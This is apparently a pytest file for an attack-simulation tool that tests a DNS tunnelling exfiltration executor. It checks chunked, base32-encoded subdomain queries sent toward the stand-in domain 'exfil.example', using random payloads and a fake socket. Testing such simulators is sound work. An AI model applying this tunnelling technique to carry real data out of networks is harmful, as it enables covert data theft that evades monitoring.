from __future__ import annotations

from capex.attacks import exfil_dns
from capex.models import DeviceConfig, DnsTunnelExfilAttackConfig


class _FakeUdpSocket:
    def __init__(self) -> None:
        self.sent: list[tuple[bytes, tuple[str, int]]] = []

    def settimeout(self, timeout: float) -> None:
        pass

    def sendto(self, data: bytes, address: tuple[str, int]) -> None:
        self.sent.append((data, address))

    def recvfrom(self, bufsize: int) -> tuple[bytes, tuple[str, int]]:
        raise TimeoutError

    def __enter__(self) -> _FakeUdpSocket:
        return self

    def __exit__(self, *exc_info: object) -> None:
        pass


def test_dns_tunnel_exfil_executor_sends_one_query_per_chunk(monkeypatch) -> None:
    fake_socket = _FakeUdpSocket()
    monkeypatch.setattr(exfil_dns.socket, 'socket', lambda *args, **kwargs: fake_socket)
    monkeypatch.setattr(exfil_dns.os, 'urandom', lambda n: b'\x01' * n)
    monkeypatch.setattr(exfil_dns.random, 'randint', lambda a, b: 0x1234)

    device = DeviceConfig(name='dev1', ip='192.168.1.1')
    attack = DnsTunnelExfilAttackConfig(
        name='dns_tunnel_exfil',
        label='DNS_Tunnel_Exfil',
        payload_size_bytes=100,
        chunk_size_bytes=32,
        base_domain='exfil.example',
    )
    executor = exfil_dns.DnsTunnelExfilExecutor(attack=attack)

    detail = executor.execute(device=device)

    assert detail == 'queries_sent=4'
    assert len(fake_socket.sent) == 4
    for _data, address in fake_socket.sent:
        assert address == ('192.168.1.1', 53)


def test_dns_tunnel_exfil_executor_encodes_chunk_as_base32_subdomain_label(monkeypatch) -> None:
    fake_socket = _FakeUdpSocket()
    monkeypatch.setattr(exfil_dns.socket, 'socket', lambda *args, **kwargs: fake_socket)
    monkeypatch.setattr(exfil_dns.os, 'urandom', lambda n: b'\xff' * n)
    monkeypatch.setattr(exfil_dns.random, 'randint', lambda a, b: 0x1234)

    device = DeviceConfig(name='dev1', ip='192.168.1.1')
    attack = DnsTunnelExfilAttackConfig(
        name='dns_tunnel_exfil',
        label='DNS_Tunnel_Exfil',
        payload_size_bytes=8,
        chunk_size_bytes=8,
        base_domain='exfil.example',
    )
    executor = exfil_dns.DnsTunnelExfilExecutor(attack=attack)

    executor.execute(device=device)

    expected_label = exfil_dns.encode_chunk_label(b'\xff' * 8)
    sent_bytes, _address = fake_socket.sent[0]
    expected_query = exfil_dns.build_dns_query(domain=f'{expected_label}.exfil.example', query_id=0x1234)
    assert sent_bytes == expected_query


def test_dns_tunnel_exfil_executor_sends_single_query_for_small_payload(monkeypatch) -> None:
    fake_socket = _FakeUdpSocket()
    monkeypatch.setattr(exfil_dns.socket, 'socket', lambda *args, **kwargs: fake_socket)
    monkeypatch.setattr(exfil_dns.os, 'urandom', lambda n: b'\x02' * n)
    monkeypatch.setattr(exfil_dns.random, 'randint', lambda a, b: 0x1234)

    device = DeviceConfig(name='dev1', ip='192.168.1.1')
    attack = DnsTunnelExfilAttackConfig(
        name='dns_tunnel_exfil',
        label='DNS_Tunnel_Exfil',
        payload_size_bytes=10,
        chunk_size_bytes=32,
    )
    executor = exfil_dns.DnsTunnelExfilExecutor(attack=attack)

    detail = executor.execute(device=device)

    assert detail == 'queries_sent=1'
